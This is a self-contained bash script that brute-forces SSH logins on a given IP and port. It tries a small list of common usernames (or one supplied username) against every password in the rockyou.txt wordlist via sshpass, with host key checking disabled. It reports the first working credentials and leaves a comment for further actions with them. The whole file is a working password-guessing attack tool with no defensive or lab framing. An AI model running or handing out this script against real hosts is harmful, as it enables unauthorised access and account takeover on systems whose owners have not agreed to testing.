#!/bin/bash

# Usage function to display an example if arguments are not provided
usage() {
    echo "Usage: $0 -t TARGET_IP -p PORT [-v]"
    echo "Example: $0 -t 172.16.10.13 -p 22 -v"
    exit 1
}

# Default values
VERBOSE=0

# Parse arguments
while getopts "t:p:v" opt; do
  case $opt in
    t) TARGET="$OPTARG" ;;
    p) PORT="$OPTARG" ;;
    v) VERBOSE=1 ;;
    *) usage ;;
  esac
done

# Check if required arguments are provided
if [ -z "$TARGET" ] || [ -z "$PORT" ]; then
    usage
fi

# Prompt the user for a known username or use the default list
read -p "Do you know the username? (yes/no): " KNOWN_USER

if [ "$KNOWN_USER" == "yes" ]; then
    read -p "Enter the username: " SINGLE_USER
    USERNAMES=("$SINGLE_USER")
else
    USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
fi

# Define the password file
PASSWORD_FILE="/usr/share/wordlists/rockyou.txt"

echo "Starting SSH credential testing on ${TARGET}:${PORT}..."

# Loop through each combination of usernames and passwords
for user in "${USERNAMES[@]}"; do
    while IFS= read -r pass; do
        if [ $VERBOSE -eq 1 ]; then
            echo "Testing credentials: ${user} / ${pass}"
        fi
        # Check the exit code to determine if the login was successful
        if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
            -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
            echo "Successful login with credentials:"
            echo "Host: ${TARGET}"
            echo "Username: ${user}"
            echo "Password: ${pass}"
            # Perform additional actions here using the credentials
            exit 0
        fi
    done < "${PASSWORD_FILE}"
done

echo "No valid credentials found."
